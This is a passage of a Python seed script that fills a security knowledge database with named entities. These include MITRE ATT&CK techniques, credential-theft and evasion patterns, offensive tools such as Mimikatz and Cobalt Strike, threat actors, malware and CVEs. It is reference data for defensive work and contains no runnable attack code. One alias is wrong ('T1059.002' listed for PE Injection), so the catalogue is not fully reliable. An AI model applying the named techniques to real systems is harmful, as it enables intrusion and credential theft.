"""Seed a comprehensive cybersecurity knowledge corpus into the Security Knowledge database.

Covers 30+ security domains:
  - MITRE ATT&CK Enterprise (tactics, techniques, sub-techniques)
  - Windows Internals, Security Mechanisms, ETW
  - Process Injection, Privilege Escalation, Credential Access
  - Defense Evasion, Network Attacks, Active Directory
  - Malware Analysis, Threat Intelligence, EDR/SIEM
  - Cloud Security, Web App Security, Forensics/IR
  - Vulnerability Research, Cryptography, Scripting/Tooling
  - Red Team, Blue Team, Ransomware, Threat Actors
  - CrowdStrike Falcon Platform, Frameworks & Compliance

Usage:
  python -m seed.seed_corpus

Idempotent — safe to run repeatedly. Entities matched by (kind, canonical_name).
Relationships matched by (from_entity_id, to_entity_id, kind).
"""
from __future__ import annotations

import asyncio
import sys
from datetime import UTC, datetime

import structlog
from sqlalchemy import select
from sqlalchemy.ext.asyncio import AsyncSession, create_async_engine
from sqlalchemy.orm import sessionmaker

from app.config import settings

logger = structlog.get_logger(__name__)

# ---------------------------------------------------------------------------
# Corpus data
# ---------------------------------------------------------------------------

SOURCES = [
    {"knowledge_id": "src_mitre_attack",   "name": "MITRE ATT&CK",             "url": "https://attack.mitre.org/"},
    {"knowledge_id": "src_nist_sp800_53",  "name": "NIST SP 800-53 Rev 5",     "url": "https://csrc.nist.gov/publications/detail/sp/800-53/rev-5/final"},
    {"knowledge_id": "src_nist_csf",       "name": "NIST CSF 2.0",             "url": "https://www.nist.gov/cyberframework"},
    {"knowledge_id": "src_cis_controls",   "name": "CIS Controls v8",          "url": "https://www.cisecurity.org/controls/v8"},
    {"knowledge_id": "src_crowdstrike",    "name": "CrowdStrike Adversary Intel","url": "https://www.crowdstrike.com/adversary-universe/"},
    {"knowledge_id": "src_elastic_sec",    "name": "Elastic Security Research", "url": "https://www.elastic.co/security-labs"},
    {"knowledge_id": "src_microsoft_sec",  "name": "Microsoft Security Blog",   "url": "https://www.microsoft.com/en-us/security/blog"},
    {"knowledge_id": "src_sans",           "name": "SANS Institute",            "url": "https://www.sans.org"},
    {"knowledge_id": "src_nist_nvd",       "name": "NIST NVD",                 "url": "https://nvd.nist.gov/"},
    {"knowledge_id": "src_cisa",           "name": "CISA Advisories",          "url": "https://www.cisa.gov/news-events/cybersecurity-advisories"},
    {"knowledge_id": "src_mandiant",       "name": "Mandiant Threat Intel",     "url": "https://www.mandiant.com/resources"},
    {"knowledge_id": "src_red_canary",     "name": "Red Canary Threat Detection","url": "https://redcanary.com/threat-detection-report/"},
    {"knowledge_id": "src_sigma",          "name": "Sigma Rules HQ",           "url": "https://github.com/SigmaHQ/sigma"},
    {"knowledge_id": "src_lolbas",         "name": "LOLBAS Project",           "url": "https://lolbas-project.github.io/"},
]

ENTITIES: list[dict] = [
    # -----------------------------------------------------------------------
    # MITRE ATT&CK Tactics
    # -----------------------------------------------------------------------
    {"knowledge_id": "ent_tactic_recon",        "kind": "tactic", "canonical_name": "Reconnaissance",       "mitre_attack_id": "TA0043", "aliases": ["TA0043"]},
    {"knowledge_id": "ent_tactic_resource_dev", "kind": "tactic", "canonical_name": "Resource Development", "mitre_attack_id": "TA0042", "aliases": ["TA0042"]},
    {"knowledge_id": "ent_tactic_initial_access","kind": "tactic", "canonical_name": "Initial Access",       "mitre_attack_id": "TA0001", "aliases": ["TA0001"]},
    {"knowledge_id": "ent_tactic_execution",    "kind": "tactic", "canonical_name": "Execution",             "mitre_attack_id": "TA0002", "aliases": ["TA0002"]},
    {"knowledge_id": "ent_tactic_persistence",  "kind": "tactic", "canonical_name": "Persistence",           "mitre_attack_id": "TA0003", "aliases": ["TA0003"]},
    {"knowledge_id": "ent_tactic_priv_esc",     "kind": "tactic", "canonical_name": "Privilege Escalation",  "mitre_attack_id": "TA0004", "aliases": ["TA0004"]},
    {"knowledge_id": "ent_tactic_defense_evasion","kind": "tactic","canonical_name": "Defense Evasion",      "mitre_attack_id": "TA0005", "aliases": ["TA0005"]},
    {"knowledge_id": "ent_tactic_cred_access",  "kind": "tactic", "canonical_name": "Credential Access",     "mitre_attack_id": "TA0006", "aliases": ["TA0006"]},
    {"knowledge_id": "ent_tactic_discovery",    "kind": "tactic", "canonical_name": "Discovery",             "mitre_attack_id": "TA0007", "aliases": ["TA0007"]},
    {"knowledge_id": "ent_tactic_lateral_move", "kind": "tactic", "canonical_name": "Lateral Movement",      "mitre_attack_id": "TA0008", "aliases": ["TA0008"]},
    {"knowledge_id": "ent_tactic_collection",   "kind": "tactic", "canonical_name": "Collection",            "mitre_attack_id": "TA0009", "aliases": ["TA0009"]},
    {"knowledge_id": "ent_tactic_c2",           "kind": "tactic", "canonical_name": "Command and Control",   "mitre_attack_id": "TA0011", "aliases": ["TA0011", "C2"]},
    {"knowledge_id": "ent_tactic_exfiltration", "kind": "tactic", "canonical_name": "Exfiltration",          "mitre_attack_id": "TA0010", "aliases": ["TA0010"]},
    {"knowledge_id": "ent_tactic_impact",       "kind": "tactic", "canonical_name": "Impact",                "mitre_attack_id": "TA0040", "aliases": ["TA0040"]},

    # -----------------------------------------------------------------------
    # MITRE ATT&CK Techniques (high-priority)
    # -----------------------------------------------------------------------
    {"knowledge_id": "ent_technique_t1059",     "kind": "technique", "canonical_name": "Command and Scripting Interpreter", "mitre_attack_id": "T1059",    "aliases": ["T1059"]},
    {"knowledge_id": "ent_technique_t1055",     "kind": "technique", "canonical_name": "Process Injection",                 "mitre_attack_id": "T1055",    "aliases": ["T1055"]},
    {"knowledge_id": "ent_technique_t1003",     "kind": "technique", "canonical_name": "OS Credential Dumping",             "mitre_attack_id": "T1003",    "aliases": ["T1003"]},
    {"knowledge_id": "ent_technique_t1021",     "kind": "technique", "canonical_name": "Remote Services",                   "mitre_attack_id": "T1021",    "aliases": ["T1021"]},
    {"knowledge_id": "ent_technique_t1547",     "kind": "technique", "canonical_name": "Boot or Logon Autostart Execution", "mitre_attack_id": "T1547",    "aliases": ["T1547"]},
    {"knowledge_id": "ent_technique_t1070",     "kind": "technique", "canonical_name": "Indicator Removal",                 "mitre_attack_id": "T1070",    "aliases": ["T1070"]},
    {"knowledge_id": "ent_technique_t1566",     "kind": "technique", "canonical_name": "Phishing",                          "mitre_attack_id": "T1566",    "aliases": ["T1566"]},
    {"knowledge_id": "ent_technique_t1190",     "kind": "technique", "canonical_name": "Exploit Public-Facing Application", "mitre_attack_id": "T1190",    "aliases": ["T1190"]},
    {"knowledge_id": "ent_technique_t1078",     "kind": "technique", "canonical_name": "Valid Accounts",                    "mitre_attack_id": "T1078",    "aliases": ["T1078"]},
    {"knowledge_id": "ent_technique_t1486",     "kind": "technique", "canonical_name": "Data Encrypted for Impact",         "mitre_attack_id": "T1486",    "aliases": ["T1486"]},
    {"knowledge_id": "ent_technique_t1082",     "kind": "technique", "canonical_name": "System Information Discovery",      "mitre_attack_id": "T1082",    "aliases": ["T1082"]},
    {"knowledge_id": "ent_technique_t1083",     "kind": "technique", "canonical_name": "File and Directory Discovery",      "mitre_attack_id": "T1083",    "aliases": ["T1083"]},
    {"knowledge_id": "ent_technique_t1027",     "kind": "technique", "canonical_name": "Obfuscated Files or Information",   "mitre_attack_id": "T1027",    "aliases": ["T1027"]},
    {"knowledge_id": "ent_technique_t1562",     "kind": "technique", "canonical_name": "Impair Defenses",                   "mitre_attack_id": "T1562",    "aliases": ["T1562"]},
    {"knowledge_id": "ent_technique_t1112",     "kind": "technique", "canonical_name": "Modify Registry",                   "mitre_attack_id": "T1112",    "aliases": ["T1112"]},
    {"knowledge_id": "ent_technique_t1136",     "kind": "technique", "canonical_name": "Create Account",                    "mitre_attack_id": "T1136",    "aliases": ["T1136"]},
    {"knowledge_id": "ent_technique_t1053",     "kind": "technique", "canonical_name": "Scheduled Task/Job",                "mitre_attack_id": "T1053",    "aliases": ["T1053"]},
    {"knowledge_id": "ent_technique_t1543",     "kind": "technique", "canonical_name": "Create or Modify System Process",   "mitre_attack_id": "T1543",    "aliases": ["T1543"]},
    {"knowledge_id": "ent_technique_t1569",     "kind": "technique", "canonical_name": "System Services",                   "mitre_attack_id": "T1569",    "aliases": ["T1569"]},
    {"knowledge_id": "ent_technique_t1071",     "kind": "technique", "canonical_name": "Application Layer Protocol",        "mitre_attack_id": "T1071",    "aliases": ["T1071"]},
    {"knowledge_id": "ent_technique_t1041",     "kind": "technique", "canonical_name": "Exfiltration Over C2 Channel",      "mitre_attack_id": "T1041",    "aliases": ["T1041"]},
    {"knowledge_id": "ent_technique_t1105",     "kind": "technique", "canonical_name": "Ingress Tool Transfer",             "mitre_attack_id": "T1105",    "aliases": ["T1105"]},
    {"knowledge_id": "ent_technique_t1018",     "kind": "technique", "canonical_name": "Remote System Discovery",           "mitre_attack_id": "T1018",    "aliases": ["T1018"]},
    {"knowledge_id": "ent_technique_t1057",     "kind": "technique", "canonical_name": "Process Discovery",                 "mitre_attack_id": "T1057",    "aliases": ["T1057"]},
    {"knowledge_id": "ent_technique_t1033",     "kind": "technique", "canonical_name": "System Owner/User Discovery",       "mitre_attack_id": "T1033",    "aliases": ["T1033"]},

    # Sub-techniques
    {"knowledge_id": "ent_sub_t1059_001", "kind": "subtechnique", "canonical_name": "PowerShell",           "mitre_attack_id": "T1059.001", "aliases": ["T1059.001"]},
    {"knowledge_id": "ent_sub_t1059_003", "kind": "subtechnique", "canonical_name": "Windows Command Shell", "mitre_attack_id": "T1059.003", "aliases": ["T1059.003"]},
    {"knowledge_id": "ent_sub_t1059_005", "kind": "subtechnique", "canonical_name": "Visual Basic",          "mitre_attack_id": "T1059.005", "aliases": ["T1059.005", "VBScript"]},
    {"knowledge_id": "ent_sub_t1059_007", "kind": "subtechnique", "canonical_name": "JavaScript",            "mitre_attack_id": "T1059.007", "aliases": ["T1059.007", "JScript"]},
    {"knowledge_id": "ent_sub_t1055_001", "kind": "subtechnique", "canonical_name": "Dynamic-link Library Injection",      "mitre_attack_id": "T1055.001", "aliases": ["T1055.001", "DLL Injection"]},
    {"knowledge_id": "ent_sub_t1055_002", "kind": "subtechnique", "canonical_name": "Portable Executable Injection",        "mitre_attack_id": "T1055.002", "aliases": ["T1059.002", "PE Injection"]},
    {"knowledge_id": "ent_sub_t1055_003", "kind": "subtechnique", "canonical_name": "Thread Execution Hijacking",           "mitre_attack_id": "T1055.003", "aliases": ["T1055.003"]},
    {"knowledge_id": "ent_sub_t1055_012", "kind": "subtechnique", "canonical_name": "Process Hollowing",                    "mitre_attack_id": "T1055.012", "aliases": ["T1055.012", "RunPE"]},
    {"knowledge_id": "ent_sub_t1003_001", "kind": "subtechnique", "canonical_name": "LSASS Memory",                         "mitre_attack_id": "T1003.001", "aliases": ["T1003.001"]},
    {"knowledge_id": "ent_sub_t1003_002", "kind": "subtechnique", "canonical_name": "Security Account Manager",             "mitre_attack_id": "T1003.002", "aliases": ["T1003.002", "SAM"]},
    {"knowledge_id": "ent_sub_t1003_003", "kind": "subtechnique", "canonical_name": "NTDS",                                 "mitre_attack_id": "T1003.003", "aliases": ["T1003.003", "NTDS.dit"]},
    {"knowledge_id": "ent_sub_t1562_001", "kind": "subtechnique", "canonical_name": "Disable or Modify Tools",              "mitre_attack_id": "T1562.001", "aliases": ["T1562.001"]},
    {"knowledge_id": "ent_sub_t1021_001", "kind": "subtechnique", "canonical_name": "Remote Desktop Protocol",              "mitre_attack_id": "T1021.001", "aliases": ["T1021.001", "RDP"]},
    {"knowledge_id": "ent_sub_t1021_002", "kind": "subtechnique", "canonical_name": "SMB/Windows Admin Shares",             "mitre_attack_id": "T1021.002", "aliases": ["T1021.002", "SMB"]},
    {"knowledge_id": "ent_sub_t1021_006", "kind": "subtechnique", "canonical_name": "Windows Remote Management",            "mitre_attack_id": "T1021.006", "aliases": ["T1021.006", "WinRM"]},
    {"knowledge_id": "ent_sub_t1218_011", "kind": "subtechnique", "canonical_name": "Rundll32",                             "mitre_attack_id": "T1218.011", "aliases": ["T1218.011"]},

    # -----------------------------------------------------------------------
    # Windows Internals
    # -----------------------------------------------------------------------
    {"knowledge_id": "ent_win_lsass",      "kind": "windows_object",            "canonical_name": "LSASS",               "aliases": ["Local Security Authority Subsystem Service", "lsass.exe"]},
    {"knowledge_id": "ent_win_eprocess",   "kind": "windows_kernel_component",  "canonical_name": "EPROCESS",            "aliases": ["_EPROCESS"]},
    {"knowledge_id": "ent_win_ethread",    "kind": "windows_kernel_component",  "canonical_name": "ETHREAD",             "aliases": ["_ETHREAD"]},
    {"knowledge_id": "ent_win_token",      "kind": "windows_object",            "canonical_name": "Access Token",        "aliases": ["TOKEN", "_TOKEN"]},
    {"knowledge_id": "ent_win_handle",     "kind": "windows_object",            "canonical_name": "Handle Table",        "aliases": ["HANDLE_TABLE", "_HANDLE_TABLE"]},
    {"knowledge_id": "ent_win_peb",        "kind": "windows_object",            "canonical_name": "Process Environment Block", "aliases": ["PEB", "_PEB"]},
    {"knowledge_id": "ent_win_teb",        "kind": "windows_object",            "canonical_name": "Thread Environment Block", "aliases": ["TEB", "_TEB"]},
    {"knowledge_id": "ent_win_vad",        "kind": "windows_kernel_component",  "canonical_name": "Virtual Address Descriptor", "aliases": ["VAD", "_MMVAD"]},
    {"knowledge_id": "ent_win_alpc",       "kind": "windows_kernel_component",  "canonical_name": "ALPC",                "aliases": ["Advanced Local Procedure Call"]},
    {"knowledge_id": "ent_win_ntdll",      "kind": "windows_user_mode_component","canonical_name": "ntdll.dll",           "aliases": ["ntdll", "Native API"]},
    {"knowledge_id": "ent_win_syscall",    "kind": "concept",                   "canonical_name": "Windows Syscall",     "aliases": ["system call", "syscall", "SSDT"]},
    {"knowledge_id": "ent_win_wow64",      "kind": "windows_kernel_component",  "canonical_name": "WoW64",               "aliases": ["Windows-on-Windows 64-bit", "wow64.dll"]},

    # Security mechanisms
    {"knowledge_id": "ent_mech_aslr",      "kind": "concept",    "canonical_name": "ASLR",                  "aliases": ["Address Space Layout Randomization"]},
    {"knowledge_id": "ent_mech_dep",       "kind": "concept",    "canonical_name": "DEP",                   "aliases": ["Data Execution Prevention", "NX", "No-Execute"]},
    {"knowledge_id": "ent_mech_cfg",       "kind": "concept",    "canonical_name": "Control Flow Guard",    "aliases": ["CFG"]},
    {"knowledge_id": "ent_mech_cet",       "kind": "concept",    "canonical_name": "Control-flow Enforcement Technology", "aliases": ["CET", "Shadow Stack"]},
    {"knowledge_id": "ent_mech_ppl",       "kind": "concept",    "canonical_name": "Protected Process Light", "aliases": ["PPL"]},
    {"knowledge_id": "ent_mech_vbs",       "kind": "concept",    "canonical_name": "Virtualization-Based Security", "aliases": ["VBS", "Credential Guard"]},
    {"knowledge_id": "ent_mech_amsi",      "kind": "concept",    "canonical_name": "AMSI",                  "aliases": ["Antimalware Scan Interface"]},
    {"knowledge_id": "ent_mech_mic",       "kind": "concept",    "canonical_name": "Mandatory Integrity Control", "aliases": ["MIC", "Integrity Levels"]},
    {"knowledge_id": "ent_mech_elam",      "kind": "concept",    "canonical_name": "Early Launch Anti-Malware", "aliases": ["ELAM"]},
    {"knowledge_id": "ent_mech_patchguard","kind": "concept",    "canonical_name": "PatchGuard",            "aliases": ["KPP", "Kernel Patch Protection"]},
    {"knowledge_id": "ent_mech_hvci",      "kind": "concept",    "canonical_name": "HVCI",                  "aliases": ["Hypervisor-Protected Code Integrity", "Memory Integrity"]},
    {"knowledge_id": "ent_priv_sedebug",   "kind": "concept",    "canonical_name": "SeDebugPrivilege",      "aliases": ["debug privilege"]},
    {"knowledge_id": "ent_priv_seimpersonate","kind": "concept", "canonical_name": "SeImpersonatePrivilege","aliases": ["impersonate privilege"]},
    {"knowledge_id": "ent_priv_seload",    "kind": "concept",    "canonical_name": "SeLoadDriverPrivilege", "aliases": ["load driver privilege"]},

    # ETW providers
    {"knowledge_id": "ent_etw_kernel_process", "kind": "etw_provider", "canonical_name": "Microsoft-Windows-Kernel-Process", "aliases": ["Kernel-Process ETW"]},
    {"knowledge_id": "ent_etw_kernel_file",    "kind": "etw_provider", "canonical_name": "Microsoft-Windows-Kernel-File",    "aliases": ["Kernel-File ETW"]},
    {"knowledge_id": "ent_etw_kernel_net",     "kind": "etw_provider", "canonical_name": "Microsoft-Windows-Kernel-Network", "aliases": ["Kernel-Network ETW"]},
    {"knowledge_id": "ent_etw_amsi",           "kind": "etw_provider", "canonical_name": "Microsoft-Antimalware-Scan-Interface", "aliases": ["AMSI ETW"]},
    {"knowledge_id": "ent_etw_threat_intel",   "kind": "etw_provider", "canonical_name": "Microsoft-Windows-Threat-Intelligence", "aliases": ["TI ETW provider"]},

    # -----------------------------------------------------------------------
    # Tools & Frameworks
    # -----------------------------------------------------------------------
    {"knowledge_id": "ent_tool_mimikatz",    "kind": "tool",      "canonical_name": "Mimikatz",         "aliases": ["mimidrv", "sekurlsa"]},
    {"knowledge_id": "ent_tool_rubeus",      "kind": "tool",      "canonical_name": "Rubeus",           "aliases": []},
    {"knowledge_id": "ent_tool_bloodhound",  "kind": "tool",      "canonical_name": "BloodHound",       "aliases": ["SharpHound"]},
    {"knowledge_id": "ent_tool_cobaltstrike","kind": "tool",      "canonical_name": "Cobalt Strike",    "aliases": ["CS", "beacon"]},
    {"knowledge_id": "ent_tool_metasploit",  "kind": "tool",      "canonical_name": "Metasploit",       "aliases": ["MSF", "Meterpreter"]},
    {"knowledge_id": "ent_tool_impacket",    "kind": "tool",      "canonical_name": "Impacket",         "aliases": ["secretsdump", "psexec.py"]},
    {"knowledge_id": "ent_tool_sliver",      "kind": "tool",      "canonical_name": "Sliver",           "aliases": []},
    {"knowledge_id": "ent_tool_havoc",       "kind": "tool",      "canonical_name": "Havoc C2",         "aliases": ["Havoc"]},
    {"knowledge_id": "ent_tool_brute_ratel", "kind": "tool",      "canonical_name": "Brute Ratel C4",   "aliases": ["BRC4"]},
    {"knowledge_id": "ent_tool_sysmon",      "kind": "tool",      "canonical_name": "Sysmon",           "aliases": ["System Monitor"]},
    {"knowledge_id": "ent_tool_volatility",  "kind": "tool",      "canonical_name": "Volatility 3",     "aliases": ["vol.py", "volatility"]},
    {"knowledge_id": "ent_tool_windbg",      "kind": "debugger",  "canonical_name": "WinDbg",           "aliases": ["WinDbg Preview", "kd.exe"]},
    {"knowledge_id": "ent_tool_x64dbg",      "kind": "debugger",  "canonical_name": "x64dbg",           "aliases": ["x32dbg"]},
    {"knowledge_id": "ent_tool_ida",         "kind": "debugger",  "canonical_name": "IDA Pro",          "aliases": ["IDA", "Hex-Rays"]},
    {"knowledge_id": "ent_tool_ghidra",      "kind": "debugger",  "canonical_name": "Ghidra",           "aliases": []},
    {"knowledge_id": "ent_tool_frida",       "kind": "tool",      "canonical_name": "Frida",            "aliases": []},
    {"knowledge_id": "ent_tool_powershell",  "kind": "tool",      "canonical_name": "PowerShell",       "aliases": ["pwsh", "powershell.exe"]},
    {"knowledge_id": "ent_tool_certutil",    "kind": "tool",      "canonical_name": "certutil",         "aliases": ["LOLBin - certutil"]},
    {"knowledge_id": "ent_tool_mshta",       "kind": "tool",      "canonical_name": "mshta.exe",        "aliases": ["MSHTA", "LOLBin - mshta"]},
    {"knowledge_id": "ent_tool_rundll32",    "kind": "tool",      "canonical_name": "rundll32.exe",     "aliases": ["rundll32", "LOLBin - rundll32"]},
    {"knowledge_id": "ent_tool_regsvr32",    "kind": "tool",      "canonical_name": "regsvr32.exe",     "aliases": ["regsvr32", "Squiblydoo"]},
    {"knowledge_id": "ent_tool_msbuild",     "kind": "tool",      "canonical_name": "MSBuild.exe",      "aliases": ["MSBuild", "LOLBin - msbuild"]},
    {"knowledge_id": "ent_tool_velociraptor","kind": "tool",      "canonical_name": "Velociraptor",     "aliases": []},
    {"knowledge_id": "ent_tool_osquery",     "kind": "tool",      "canonical_name": "osquery",          "aliases": []},
    {"knowledge_id": "ent_tool_atomic_red",  "kind": "tool",      "canonical_name": "Atomic Red Team",  "aliases": ["ART"]},

    # -----------------------------------------------------------------------
    # Frameworks
    # -----------------------------------------------------------------------
    {"knowledge_id": "ent_fw_mitre_attack",  "kind": "framework",  "canonical_name": "MITRE ATT&CK",         "aliases": ["ATT&CK"]},
    {"knowledge_id": "ent_fw_nist_csf",      "kind": "framework",  "canonical_name": "NIST Cybersecurity Framework", "aliases": ["CSF", "NIST CSF 2.0"]},
    {"knowledge_id": "ent_fw_nist_800_53",   "kind": "framework",  "canonical_name": "NIST SP 800-53",        "aliases": ["800-53 rev 5"]},
    {"knowledge_id": "ent_fw_cis_controls",  "kind": "framework",  "canonical_name": "CIS Controls v8",       "aliases": ["CIS v8"]},
    {"knowledge_id": "ent_fw_stix",          "kind": "framework",  "canonical_name": "STIX 2.1",             "aliases": ["STIX", "Structured Threat Information eXpression"]},
    {"knowledge_id": "ent_fw_taxii",         "kind": "framework",  "canonical_name": "TAXII 2.1",            "aliases": ["TAXII", "Trusted Automated eXchange of Intelligence Information"]},
    {"knowledge_id": "ent_fw_kill_chain",    "kind": "framework",  "canonical_name": "Cyber Kill Chain",     "aliases": ["Lockheed Martin Kill Chain"]},
    {"knowledge_id": "ent_fw_diamond",       "kind": "framework",  "canonical_name": "Diamond Model",        "aliases": []},
    {"knowledge_id": "ent_fw_pyramid_pain",  "kind": "framework",  "canonical_name": "Pyramid of Pain",      "aliases": []},
    {"knowledge_id": "ent_fw_pci_dss",       "kind": "framework",  "canonical_name": "PCI DSS 4.0",          "aliases": ["PCI DSS"]},
    {"knowledge_id": "ent_fw_iso27001",      "kind": "framework",  "canonical_name": "ISO 27001:2022",        "aliases": ["ISO 27001", "ISMS"]},

    # -----------------------------------------------------------------------
    # Credential Attack Concepts
    # -----------------------------------------------------------------------
    {"knowledge_id": "ent_cred_kerberoasting",   "kind": "attack_pattern", "canonical_name": "Kerberoasting",         "aliases": ["SPN scanning"]},
    {"knowledge_id": "ent_cred_asreproast",      "kind": "attack_pattern", "canonical_name": "AS-REP Roasting",       "aliases": ["ASREP Roasting"]},
    {"knowledge_id": "ent_cred_pass_ticket",     "kind": "attack_pattern", "canonical_name": "Pass-the-Ticket",       "aliases": ["PTT"]},
    {"knowledge_id": "ent_cred_overpass_hash",   "kind": "attack_pattern", "canonical_name": "Overpass-the-Hash",     "aliases": ["OtH", "Pass-the-Key"]},
    {"knowledge_id": "ent_cred_golden_ticket",   "kind": "attack_pattern", "canonical_name": "Golden Ticket",         "aliases": ["krbtgt abuse"]},
    {"knowledge_id": "ent_cred_silver_ticket",   "kind": "attack_pattern", "canonical_name": "Silver Ticket",         "aliases": []},
    {"knowledge_id": "ent_cred_dcsync",          "kind": "attack_pattern", "canonical_name": "DCSync",                "aliases": ["lsadump::dcsync"]},
    {"knowledge_id": "ent_cred_dpapi",           "kind": "attack_pattern", "canonical_name": "DPAPI Credential Extraction", "aliases": ["CryptUnprotectData", "DPAPI"]},
    {"knowledge_id": "ent_cred_ntlm_relay",      "kind": "attack_pattern", "canonical_name": "NTLM Relay",            "aliases": ["NTLM relay attack", "Responder"]},

    # -----------------------------------------------------------------------
    # Active Directory Attack Patterns
    # -----------------------------------------------------------------------
    {"knowledge_id": "ent_ad_acl_abuse",          "kind": "attack_pattern", "canonical_name": "AD ACL Abuse",               "aliases": ["GenericAll", "WriteDACL", "WriteOwner"]},
    {"knowledge_id": "ent_ad_unconstrained_deleg", "kind": "attack_pattern", "canonical_name": "Unconstrained Delegation",   "aliases": []},
    {"knowledge_id": "ent_ad_rbcd",               "kind": "attack_pattern", "canonical_name": "Resource-Based Constrained Delegation", "aliases": ["RBCD"]},
    {"knowledge_id": "ent_ad_adcs_esc1",          "kind": "attack_pattern", "canonical_name": "AD CS ESC1",                 "aliases": ["ESC1", "certificate template abuse"]},
    {"knowledge_id": "ent_ad_sid_history",        "kind": "attack_pattern", "canonical_name": "SID History Injection",      "aliases": []},
    {"knowledge_id": "ent_ad_laps_abuse",         "kind": "attack_pattern", "canonical_name": "LAPS Credential Abuse",      "aliases": ["ms-MCS-AdmPwd"]},

    # -----------------------------------------------------------------------
    # Defense Evasion Concepts
    # -----------------------------------------------------------------------
    {"knowledge_id": "ent_evasion_amsi_bypass",   "kind": "attack_pattern", "canonical_name": "AMSI Bypass",           "aliases": ["AmsiScanBuffer patch"]},
    {"knowledge_id": "ent_evasion_etw_bypass",    "kind": "attack_pattern", "canonical_name": "ETW Bypass",            "aliases": ["EtwEventWrite patch"]},
    {"knowledge_id": "ent_evasion_unhooking",     "kind": "attack_pattern", "canonical_name": "EDR Unhooking",         "aliases": ["ntdll unhooking", "direct syscall"]},
    {"knowledge_id": "ent_evasion_direct_syscall","kind": "attack_pattern", "canonical_name": "Direct Syscalls",       "aliases": ["Hell's Gate", "Halo's Gate"]},
    {"knowledge_id": "ent_evasion_parent_spoof",  "kind": "attack_pattern", "canonical_name": "Parent PID Spoofing",   "aliases": ["PPID spoofing"]},
    {"knowledge_id": "ent_evasion_timestomp",     "kind": "attack_pattern", "canonical_name": "Timestomping",          "aliases": []},
    {"knowledge_id": "ent_evasion_byovd",         "kind": "attack_pattern", "canonical_name": "Bring Your Own Vulnerable Driver", "aliases": ["BYOVD"]},
    {"knowledge_id": "ent_evasion_heavens_gate",  "kind": "attack_pattern", "canonical_name": "Heaven's Gate",         "aliases": ["WoW64 bypass"]},
    {"knowledge_id": "ent_evasion_reflective_dll","kind": "attack_pattern", "canonical_name": "Reflective DLL Injection", "aliases": []},
    {"knowledge_id": "ent_evasion_process_hollow","kind": "attack_pattern", "canonical_name": "Process Hollowing",     "aliases": ["RunPE"]},

    # -----------------------------------------------------------------------
    # Threat Actors
    # -----------------------------------------------------------------------
    {"knowledge_id": "ent_actor_apt28",  "kind": "actor", "canonical_name": "APT28",   "aliases": ["Fancy Bear", "Sofacy", "GRU", "STRONTIUM"]},
    {"knowledge_id": "ent_actor_apt29",  "kind": "actor", "canonical_name": "APT29",   "aliases": ["Cozy Bear", "Midnight Blizzard", "SVR", "NOBELIUM"]},
    {"knowledge_id": "ent_actor_apt41",  "kind": "actor", "canonical_name": "APT41",   "aliases": ["Double Dragon", "Winnti", "Barium"]},
    {"knowledge_id": "ent_actor_lazarus","kind": "actor", "canonical_name": "Lazarus Group", "aliases": ["HIDDEN COBRA", "DPRK"]},
    {"knowledge_id": "ent_actor_volt_typhoon","kind": "actor", "canonical_name": "Volt Typhoon", "aliases": ["Bronze Silhouette", "Vanguard Panda"]},
    {"knowledge_id": "ent_actor_lockbit","kind": "actor", "canonical_name": "LockBit", "aliases": ["LockBit 3.0", "ABCD ransomware"]},
    {"knowledge_id": "ent_actor_blackcat","kind": "actor","canonical_name": "BlackCat", "aliases": ["ALPHV", "Noberus"]},
    {"knowledge_id": "ent_actor_clop",   "kind": "actor", "canonical_name": "Cl0p",    "aliases": ["TA505", "FIN11"]},

    # -----------------------------------------------------------------------
    # Malware Families
    # -----------------------------------------------------------------------
    {"knowledge_id": "ent_mal_cobalt_beacon","kind": "malware", "canonical_name": "Cobalt Strike Beacon", "aliases": ["CS beacon"]},
    {"knowledge_id": "ent_mal_mimikatz",     "kind": "malware", "canonical_name": "Mimikatz",             "aliases": []},
    {"knowledge_id": "ent_mal_emotet",       "kind": "malware", "canonical_name": "Emotet",               "aliases": ["Geodo"]},
    {"knowledge_id": "ent_mal_qakbot",       "kind": "malware", "canonical_name": "QakBot",               "aliases": ["QBot", "Pinkslipbot"]},
    {"knowledge_id": "ent_mal_bazarloader",  "kind": "malware", "canonical_name": "BazarLoader",          "aliases": ["BazaLoader", "BAZAR"]},
    {"knowledge_id": "ent_mal_lockbit",      "kind": "malware", "canonical_name": "LockBit Ransomware",   "aliases": ["LockBit 3.0"]},
    {"knowledge_id": "ent_mal_sunburst",     "kind": "malware", "canonical_name": "SUNBURST",             "aliases": ["Solorigate"]},
    {"knowledge_id": "ent_mal_notpetya",     "kind": "malware", "canonical_name": "NotPetya",             "aliases": ["Petna", "ExPetr"]},

    # -----------------------------------------------------------------------
    # Vulnerabilities / CVEs
    # -----------------------------------------------------------------------
    {"knowledge_id": "ent_cve_zerologon",      "kind": "cve",           "canonical_name": "CVE-2020-1472",   "aliases": ["Zerologon"], "external_refs": {"cve": "CVE-2020-1472", "cvss": "10.0"}},
    {"knowledge_id": "ent_cve_printnightmare", "kind": "cve",           "canonical_name": "CVE-2021-34527",  "aliases": ["PrintNightmare"], "external_refs": {"cve": "CVE-2021-34527", "cvss": "8.8"}},
    {"knowledge_id": "ent_cve_log4shell",      "kind": "cve",           "canonical_name": "CVE-2021-44228",  "aliases": ["Log4Shell", "Log4j"], "external_refs": {"cve": "CVE-2021-44228", "cvss": "10.0"}},
    {"knowledge_id": "ent_cve_eternalblue",    "kind": "cve",           "canonical_name": "CVE-2017-0144",   "aliases": ["EternalBlue", "MS17-010"], "external_refs": {"cve": "CVE-2017-0144", "cvss": "9.3"}},
    {"knowledge_id": "ent_cve_xzutils",        "kind": "cve",           "canonical_name": "CVE-2024-3094",   "aliases": ["XZ Utils backdoor"], "external_refs": {"cve": "CVE-2024-3094", "cvss": "10.0"}},
    {"knowledge_id": "ent_cve_proxylogon",     "kind": "cve",           "canonical_name": "CVE-2021-26855",  "aliases": ["ProxyLogon", "Exchange 0-day"], "external_refs": {"cve": "CVE-2021-26855", "cvss": "9.8"}},

    # -----------------------------------------------------------------------
    # Detection / Event IDs
    # -----------------------------------------------------------------------
    {"knowledge_id": "ent_evtid_4624",   "kind": "event_id", "canonical_name": "Event ID 4624",  "aliases": ["Logon Success"], "external_refs": {"log_source": "Security", "provider": "Microsoft-Windows-Security-Auditing"}},
    {"knowledge_id": "ent_evtid_4625",   "kind": "event_id", "canonical_name": "Event ID 4625",  "aliases": ["Logon Failure"], "external_refs": {"log_source": "Security"}},
    {"knowledge_id": "ent_evtid_4688",   "kind": "event_id", "canonical_name": "Event ID 4688",  "aliases": ["Process Create"], "external_refs": {"log_source": "Security"}},
